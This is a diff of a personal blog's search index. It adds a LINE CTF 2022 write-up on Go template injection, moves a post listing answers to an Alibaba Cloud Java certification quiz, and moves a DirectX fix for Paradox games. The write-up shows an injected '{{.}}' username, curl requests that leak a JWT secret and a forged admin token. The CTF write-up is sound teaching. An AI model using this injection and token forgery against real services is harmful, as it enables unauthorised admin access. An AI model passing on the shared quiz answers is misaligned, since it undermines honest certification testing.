@@ -132,7 +132,7 @@
 <li>use pwntools with debugger.</li>
 </ul>
 <h1 id="use-rarun2"><a href="#use-rarun2" class="headerlink" title="use rarun2"></a>use rarun2</h1><ol>
-<li>open second terminal, enter <code>tty</code>, remember the output<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ tty</span><br><span class="line">/dev/pts/2</span><br></pre></td></tr></table></figure></li>
+<li>open second terminal, enter <code>tty</code>, record the output<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ tty</span><br><span class="line">/dev/pts/2</span><br></pre></td></tr></table></figure></li>
 <li>create a file p.rr2, write <code>stdio</code> equal the tty value you get from second termial<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># p.rr2 content</span><br><span class="line">stdio=/dev/pts/1</span><br></pre></td></tr></table></figure></li>
 <li>in second terminal, run <code>sleep 9999999999</code> to wait for output and input</li>
 <li>run <code>r2 -r p.rr2 -d vuln</code> in the first terminal and start debugging!</li>
@@ -991,6 +991,32 @@ alter table fingerprints drop partition p20
       </tags>
   </entry>
   <entry>
+    <title>阿里云白嫖</title>
+    <url>/2019/09/03/blogarchive/2019-09-03-20-18-17/</url>
+    <content><![CDATA[<p>从群里看见的</p>
+<p>大概能拿200代金券</p>
+<p>地址: <a href="https://developer.aliyun.com/certification?inviteCode=pifgful6xp346">https://developer.aliyun.com/certification?inviteCode=pifgful6xp346</a></p>
+<p>选java高级测试</p>
+<p>答案:</p>
+<p>下面关于数组排序的说明哪项是错误的？<br>Comparator接口中提供有compare（）方法实现数组的排序操作</p>
+<p>使用Runtime类的gc（）方法，可以释放垃圾内存</p>
+<p>object类中的getclass（）方法不能被覆写</p>
+<p>synchronized关键字常用来为对象加锁，从而使得对对象的访问是排他的</p>
+<p>serializable接口无法实现多线程子类定义</p>
+<p>如果要实现多线程编程下面哪项描述是错误的？<br>多线程处理类可以继承Synchronized类，同时覆写run（）方法如果要为对象回收做收尾操作，应该覆写objectt类中的finalize（）方法</p>
+<p>当执行“Math.round（-15.61）”程序后的计算结果是哪个？<br>-16</p>
+<p>public string tostring（）<br>不是object类所提供的线程操作方法</p>
+<p>下列关于Date描述错误的一项<br>直接输出Date类对象就可以取得日期时间数据，但是取得的月数是从0开始计算的</p>
+]]></content>
+      <categories>
+        <category>Life</category>
+      </categories>
+      <tags>
+        <tag>aliyun</tag>
+        <tag>白嫖</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Shadowsocks problem with config file</title>
     <url>/2019/09/03/blogarchive/2019-09-03-13-45-23/</url>
     <content><![CDATA[<p>In the default shadowsocks config file, the server ip is 127.0.0.1</p>
@@ -1031,32 +1057,6 @@ alter table fingerprints drop partition p20
         <tag>tutorial</tag>
         <tag>shadowsocks</tag>
         <tag>solution</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>阿里云白嫖</title>
-    <url>/2019/09/03/blogarchive/2019-09-03-20-18-17/</url>
-    <content><![CDATA[<p>从群里看见的</p>
-<p>大概能拿200代金券</p>
-<p>地址: <a href="https://developer.aliyun.com/certification?inviteCode=pifgful6xp346">https://developer.aliyun.com/certification?inviteCode=pifgful6xp346</a></p>
-<p>选java高级测试</p>
-<p>答案:</p>
-<p>下面关于数组排序的说明哪项是错误的？<br>Comparator接口中提供有compare（）方法实现数组的排序操作</p>
-<p>使用Runtime类的gc（）方法，可以释放垃圾内存</p>
-<p>object类中的getclass（）方法不能被覆写</p>
-<p>synchronized关键字常用来为对象加锁，从而使得对对象的访问是排他的</p>
-<p>serializable接口无法实现多线程子类定义</p>
-<p>如果要实现多线程编程下面哪项描述是错误的？<br>多线程处理类可以继承Synchronized类，同时覆写run（）方法如果要为对象回收做收尾操作，应该覆写objectt类中的finalize（）方法</p>
-<p>当执行“Math.round（-15.61）”程序后的计算结果是哪个？<br>-16</p>
-<p>public string tostring（）<br>不是object类所提供的线程操作方法</p>
-<p>下列关于Date描述错误的一项<br>直接输出Date类对象就可以取得日期时间数据，但是取得的月数是从0开始计算的</p>
-]]></content>
-      <categories>
-        <category>Life</category>
-      </categories>
-      <tags>
-        <tag>aliyun</tag>
-        <tag>白嫖</tag>
       </tags>
   </entry>
   <entry>
@@ -1501,6 +1501,28 @@ server {
       </tags>
   </entry>
   <entry>
+    <title>Paradox Interactive games can&#39;t run on windows + Solution</title>
+    <url>/2019/10/29/blogarchive/2019-10-29-17-03-47/</url>
+    <content><![CDATA[<h3 id="Issue"><a href="#Issue" class="headerlink" title="Issue"></a>Issue</h3><p>Some people may find that paradox games such as Heart of Iron will crash on windows 10.</p>
+<p>According to the steam page, paradox games often require directX 9.0c as the running time. </p>
+<p>However, since windows 10 doesn’t support directX anymore. And windows 10 pre-install with directX 11. The games can’t run properly.</p>
+<hr>
+<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><ol>
+<li><p>go to <a href="https://blog.csdn.net/VBcom/article/details/9140197">https://blog.csdn.net/VBcom/article/details/9140197</a> and download the <strong>DirectX repair</strong></p>
+</li>
+<li><p>run the application and restart your computer.</p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>系统默认</category>
+      </categories>
+      <tags>
+        <tag>solution</tag>
+        <tag>game</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>简析b站关于站内链接的正则匹配</title>
     <url>/2020/08/04/blogarchive/2020-08-04-16-05-57/</url>
     <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本文由 <a href="https://blog.boxpaper.club/">@Rorical</a> 的文章<a href="https://blog.boxpaper.club/archives/72/">《优雅的在哔哩哔哩评论区发送链接》</a>启发，目的在于学习正则匹配的基本技巧。</p>
@@ -1701,28 +1723,6 @@ https://www.bsfdvbsbilibili.com
       <tags>
         <tag>bilibili</tag>
         <tag>re</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Paradox Interactive games can&#39;t run on windows + Solution</title>
-    <url>/2019/10/29/blogarchive/2019-10-29-17-03-47/</url>
-    <content><![CDATA[<h3 id="Issue"><a href="#Issue" class="headerlink" title="Issue"></a>Issue</h3><p>Some people may find that paradox games such as Heart of Iron will crash on windows 10.</p>
-<p>According to the steam page, paradox games often require directX 9.0c as the running time. </p>
-<p>However, since windows 10 doesn’t support directX anymore. And windows 10 pre-install with directX 11. The games can’t run properly.</p>
-<hr>
-<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><ol>
-<li><p>go to <a href="https://blog.csdn.net/VBcom/article/details/9140197">https://blog.csdn.net/VBcom/article/details/9140197</a> and download the <strong>DirectX repair</strong></p>
-</li>
-<li><p>run the application and restart your computer.</p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>系统默认</category>
-      </categories>
-      <tags>
-        <tag>solution</tag>
-        <tag>game</tag>
       </tags>
   </entry>
   <entry>
@@ -2559,6 +2559,46 @@ https://www.bsfdvbsbilibili.com
         <tag>ctf</tag>
         <tag>writeup</tag>
         <tag>hack.lu</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[web] gotm (golang ssti) [line ctf 2022]</title>
+    <url>/2022/03/28/ctfwriteup/linectf2022/line-ctf-2022-web-gotm-ssti/</url>
+    <content><![CDATA[<h1 id="0x1-tl-dr"><a href="#0x1-tl-dr" class="headerlink" title="0x1 tl;dr"></a>0x1 tl;dr</h1><p>gotm, a web question in linectf 2022. This is a very good example of golang <strong>server side template injection (ssti)</strong></p>
+<h1 id="0x2-Vulnerability"><a href="#0x2-Vulnerability" class="headerlink" title="0x2 Vulnerability"></a>0x2 Vulnerability</h1><p>take a brief a look at the code. In order to get the flag. we need to visit <code>/flag</code> whici is handled by <code>flag_handler</code>. </p>
+<p><code>flag_handler</code> require a jwt token with <code>IsAdmin=True</code>. Therefore, in order to forge that, we need to have the secret of jwt token.</p>
+<span id="more"></span>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">func flag_handler(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class="line">    token := r.Header.Get(&quot;X-Token&quot;)</span><br><span class="line">    if token != &quot;&quot; &#123;</span><br><span class="line">        id, is_admin := jwt_decode(token)</span><br><span class="line">        if is_admin == true &#123;</span><br><span class="line">            // write flag</span><br><span class="line">            return</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            w.WriteHeader(http.StatusForbidden)</span><br><span class="line">            return</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Then, the problem become how to get the jwt token from the server. </p>
+<p>In order to get the jwt secret, we need to use a ssti vulnerable in the <code>root_handler</code>. </p>
+<p><code>root_handler</code> first obtain a <code>Account</code> struct from the token and print out the user id using template rendering. </p>
+<p>Since we can control the value in <code>acc.id</code> by register an account. We can inject arbitrary code into the template.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type Account struct &#123;</span><br><span class="line">    id         string</span><br><span class="line">    pw         string</span><br><span class="line">    is_admin   bool</span><br><span class="line">    secret_key string</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">func root_handler(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class="line">    ...</span><br><span class="line">    acc := get_account(id)</span><br><span class="line">    ...</span><br><span class="line">    tpl, err := template.New(&quot;&quot;).Parse(&quot;Logged in as &quot; + acc.id)</span><br><span class="line">    ...</span><br><span class="line">    return</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="0x3-Some-useful-go-ssti-injection"><a href="#0x3-Some-useful-go-ssti-injection" class="headerlink" title="0x3 Some useful go ssti injection"></a>0x3 Some useful go ssti injection</h1><ol>
+<li><code>&#123;&#123;.&#125;&#125;</code> will print out the whole struct that being passed</li>
+<li><code>&#123;&#123;.PublicField&#125;&#125;</code>  will print out the public field</li>
+<li><code>&#123;&#123;printf "%s" "asdf"&#125;&#125;</code> will do a normal printf thing</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">    &quot;os&quot;</span><br><span class="line">    &quot;text/template&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">type SSTI struct &#123;</span><br><span class="line">    privateMember         string</span><br><span class="line">    PublicMember         string</span><br><span class="line">    value   int</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    ssti := SSTI&#123;</span><br><span class="line">        privateMember : &quot;private&quot;,</span><br><span class="line">        PublicMember : &quot;public&quot;,</span><br><span class="line">        value : 1,</span><br><span class="line">    &#125;</span><br><span class="line">    tpl, _ := template.New(&quot;&quot;).Parse(&quot;Here is &#123;&#123;.&#125;&#125; \n&quot;)</span><br><span class="line">    tpl.Execute(os.Stdout, ssti) // print &quot;Here is &#123;private public 1&#125;&quot;</span><br><span class="line">    tpl, _ = template.New(&quot;&quot;).Parse(&quot;Here is &#123;&#123;.PublicMember&#125;&#125; \n&quot;)</span><br><span class="line">    tpl.Execute(os.Stdout, ssti) // print &quot;Here is public&quot;</span><br><span class="line">    tpl, _ = template.New(&quot;&quot;).Parse(&quot;Here is &#123;&#123;printf \&quot;%s\&quot; \&quot;asdf\&quot;&#125;&#125; \n&quot;)</span><br><span class="line">    tpl.Execute(os.Stdout, ssti) // print &quot;Here is asdf&quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="0x4-Solution"><a href="#0x4-Solution" class="headerlink" title="0x4 Solution"></a>0x4 Solution</h1><ol>
+<li>register as userid =  <code>&#123;&#123;.&#125;&#125;</code> using <code>/regist</code></li>
+<li>get token using <code>/auth</code> to get a token</li>
+<li>using this token to get jwt secret (which is <code>fasdf972u1031xu90zm10Av</code>)</li>
+<li>using the jwt secret to forget a jwt token.</li>
+<li>get the flag</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ curl --request GET &#x27;http://34.146.226.125/regist?id=%7B%7B%2E%7D%7D1&amp;pw=asdf&#x27;</span><br><span class="line">&#123;&quot;status&quot;:true,&quot;msg&quot;:&quot;&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ curl --request GET &#x27;http://34.146.226.125/auth?id=%7B%7B%2E%7D%7D&amp;pw=asdf&#x27;</span><br><span class="line">&#123;&quot;status&quot;:true,&quot;token&quot;:&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Int7Ln19IiwiaXNfYWRtaW4iOmZhbHNlfQ.rthp4OaE1Iau8Q9PIxoB-F9VGukYpbX1I-GpPPDSGhM&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ curl --header &#x27;X-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Int7Ln19IiwiaXNfYWRtaW4iOmZhbHNlfQ.rthp4OaE1Iau8Q9PIxoB-F9VGukYpbX1I-GpPPDSGhM&#x27; --request GET &#x27;http://34.146.226.125/&#x27;</span><br><span class="line">Logged in as &#123;&#123;&#123;.&#125;&#125; asdf false fasdf972u1031xu90zm10Av&#125;</span><br><span class="line"></span><br><span class="line">$ curl --header &#x27;X-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Int7Ln19IiwiaXNfYWRtaW4iOnRydWUsImlhdCI6MTY0ODUyMjgzMn0.nsbn28xiVYZkPPJqAJYv01PEGYuugWBIyriBaB7hcIY&#x27; --request GET &#x27;http://34.146.226.125/flag&#x27;</span><br><span class="line">&#123;&quot;status&quot;:true,&quot;msg&quot;:&quot;Hi &#123;&#123;.&#125;&#125;, flag is LINECTF&#123;country_roads_takes_me_home&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>web</tag>
       </tags>
   </entry>
   <entry>
